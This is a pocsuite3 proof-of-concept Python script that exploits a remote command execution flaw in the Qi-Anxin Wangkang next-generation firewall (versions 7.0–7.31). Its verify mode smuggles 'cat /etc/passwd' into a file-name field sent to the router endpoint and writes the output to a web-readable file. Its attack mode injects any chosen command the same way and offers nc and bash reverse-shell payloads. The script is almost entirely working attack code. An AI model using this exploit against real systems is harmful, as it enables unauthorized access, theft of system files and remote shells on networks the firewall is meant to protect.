from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import json
class DemoPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '奇安信网康下一代防火墙RCE'
    appName = '奇安信网康'
    appVersion = '7.0~7.31'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''奇安信 网康下一代防火墙被爆存在远程命令执行，通过漏洞攻击者可以获取服务器权限。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self): # 接收用户外部输出参数command
        o = OrderedDict()
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH,
        }
        o["command"] = OptDict(selected="bash", default=payload)
        return o

    def _verify(self):#验证模式
        result = {}
        try:
            headers = {
                'Content-type': 'application/json',
            }
            target = self.url+"/directdata/direct/router"
            data = json.dumps({"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;cat /etc/passwd >/var/www/html/ab4.txt"]}],"type":"rpc","tid":17,"f8839p7rqtj":"="})
            r = requests.post(url=target,timeout=8,verify=False,headers=headers,data=data)
            if r.status_code == 200 and "SSLVPN_Resource" in r.text:
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                return self.parse_output(result)
        except:
            return

    def _attack(self):
        result = {}
        cmd = self.get_option("command")
        print(cmd)
        try:
            headers = {
                'Content-type': 'application/json',
            }
            target = self.url+"/directdata/direct/router"
            data = '{"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;'+cmd+' >/var/www/html/ab4.txt"]}],"type":"rpc","tid":17,"f8839p7rqtj":"="}'
            r = requests.post(url=target,timeout=8,verify=False,headers=headers,data=json.dumps(data))
            r1 = requests.get(self.url+"ab4.txt",verify=False)
            if r1.status_code == 200 :
                print(r1.text)
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                return self.parse_output(result)
        except:
            return

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)